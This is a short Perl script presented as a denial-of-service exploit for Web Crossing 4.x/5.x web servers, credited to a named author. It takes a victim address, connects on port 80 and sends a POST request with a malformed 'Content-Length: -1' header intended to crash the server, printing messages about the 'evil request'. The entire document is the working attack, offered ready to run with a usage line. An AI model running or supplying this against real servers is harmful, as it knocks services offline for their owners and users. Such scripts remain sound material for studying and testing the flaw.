#########################################################################
#!/usr/bin/perl -w
#
#########################################################################
#!/usr/bin/perl -w
#
# Web Crossing 4.x\5.x Denial of Service Exploit
#  [ Bad 'Content-Length' Header Bug ]
#
#  - by Peter Winter-Smith [peter4020@hotmail.com]

use IO::Socket;

if(!($ARGV[0]))
{
 print "Usage: wxdos.pl <victim>\n";
 exit;
}

print "Web Crossing 4.x\\5.x Denial of Service Exploit\n" .
      "\t[ Bad 'Content-Length' Header Bug ]\n" .
      "\t[peter4020\@hotmail.com]\n\n";

$victim = IO::Socket::INET->new(Proto=>'tcp', PeerAddr=>$ARGV[0],
                             PeerPort=>"80")
                            or die "Unable to connect to $ARGV[0] on " .
                             "port 80";


$DoS    = "POST / HTTP/1.1\r\n" .
          "Content-Length: -1\r\n\r\n";

print $victim $DoS;

print "[+] Evil request made to target server ... Waiting...!\n";

sleep(4);

close($victim);

print "[+] Done!\n";
exit;
#########################################################################
